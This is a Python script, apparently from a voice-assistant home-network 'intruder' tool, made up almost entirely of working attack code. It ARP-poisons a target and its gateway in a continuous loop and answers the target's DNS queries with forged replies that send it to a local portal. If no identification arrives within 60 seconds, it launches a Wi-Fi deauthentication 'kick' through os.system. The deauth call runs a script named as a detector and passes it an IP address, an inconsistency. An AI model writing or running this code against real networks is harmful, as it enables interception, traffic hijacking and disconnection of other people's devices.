from scapy.all import *
import threading
import time
import os

# Flag to stop attack if user identifies
STOP_ATTACK = False

def start_targeted_hijack(target_ip, gateway_ip, local_ip, speaker):
    global STOP_ATTACK
    STOP_ATTACK = False
    
    # --- Part 1: ARP Poisoning (Trap them) ---
    def arp_poison():
        t_mac = getmacbyip(target_ip)
        g_mac = getmacbyip(gateway_ip)
        while not STOP_ATTACK:
            send(ARP(op=2, pdst=target_ip, hwdst=t_mac, psrc=gateway_ip), verbose=False)
            send(ARP(op=2, pdst=gateway_ip, hwdst=g_mac, psrc=target_ip), verbose=False)
            time.sleep(2)

    # --- Part 2: DNS Redirection (Show Portal) ---
    def dns_callback(pkt):
        if pkt.haslayer(DNSQR) and pkt[IP].src == target_ip:
            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                          UDP(dport=pkt[UDP].sport, sport=53)/\
                          DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, \
                          an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=local_ip))
            send(spoofed_pkt, verbose=False)

    # Start Threads
    threading.Thread(target=arp_poison, daemon=True).start()
    
    # Start Sniffer for 60 seconds (1 Min Timeout)
    print(f"[*] Interrogating {target_ip} for 60 seconds...")
    sniff_thread = threading.Thread(target=lambda: sniff(filter=f"udp port 53 and host {target_ip}", prn=dns_callback, store=0, timeout=60))
    sniff_thread.start()
    
    # Wait for response in a separate monitor
    monitor_thread = threading.Thread(target=monitor_and_kick, args=(target_ip, speaker))
    monitor_thread.start()

def monitor_and_kick(target_ip, speaker):
    global STOP_ATTACK
    start_time = time.time()
    
    while (time.time() - start_time) < 60: # 1 Minute Timeout
        if os.path.exists("intruder_log.txt"):
            with open("intruder_log.txt", "r") as f:
                data = f.read().split("|")
                msg = f"Sir, intruder identified as {data[0]}. Reason: {data[1]}"
                print(f"[SUCCESS] {msg}")
                speaker.Speak(msg)
            os.remove("intruder_log.txt")
            STOP_ATTACK = True # Stop ARP poisoning because they identified
            return
        time.sleep(2)
    
    # IF NO RESPONSE AFTER 1 MINUTE -> KICK OUT
    if not STOP_ATTACK:
        msg = f"Sir, intruder at {target_ip} failed to identify. Initiating network expulsion."
        print(f"[ALARM] {msg}")
        speaker.Speak(msg)
        
        # Trigger Deauth Attack (Kick)
        # Assuming you have a deauth function in your utils
        os.system(f"python wifi_deauth_detector.py --target {target_ip}") 
        STOP_ATTACK = True